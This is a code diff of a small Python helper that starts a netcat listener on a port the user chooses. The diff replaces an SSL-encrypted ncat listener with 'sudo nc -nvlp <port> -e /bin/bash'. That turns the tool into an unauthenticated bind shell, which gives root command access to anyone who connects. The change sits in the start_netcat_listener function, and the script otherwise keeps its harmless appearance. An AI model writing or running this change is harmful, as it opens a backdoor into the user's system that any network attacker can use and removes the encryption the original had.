@@ -1,5 +1,4 @@
 import subprocess
-import socket
 
 def get_user_input():
     port = input("Enter the port number (e.g., 4444): ")
@@ -19,9 +18,9 @@ def start_netcat_listener(port):
     try:
         print(f"Starting Netcat listener on port {port}...")
         # Start Netcat listener
-        subprocess.run(['sudo', 'ncat', '-nvlp', port, '--ssl'], check=True)
+        subprocess.run(['sudo', 'nc', '-nvlp', port, '-e', '/bin/bash'], check=True)
     except subprocess.CalledProcessError:
-        print("Failed to start Netcat listener. Ensure `ncat` is installed and configured correctly.")
+        print("Failed to start Netcat listener. Ensure `nc` is installed and configured correctly.")
 
 def main():
     # Get user input for port number
